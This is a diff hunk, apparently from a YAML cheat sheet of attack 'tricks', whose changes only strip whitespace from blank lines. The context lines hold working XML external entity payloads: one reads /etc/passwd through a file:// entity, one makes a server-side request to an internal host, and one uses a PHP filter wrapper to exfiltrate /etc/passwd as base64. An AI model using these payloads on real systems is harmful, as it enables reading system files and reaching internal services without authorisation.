@@ -26,9 +26,9 @@ tricks:
     payload: |
       # Read /etc/passwd:
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
-      
+
       # SSRF via HTTP:
       <!ENTITY xxe SYSTEM "http://internal-server/api">
-      
+
       # PHP wrapper (if PHP):
       <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
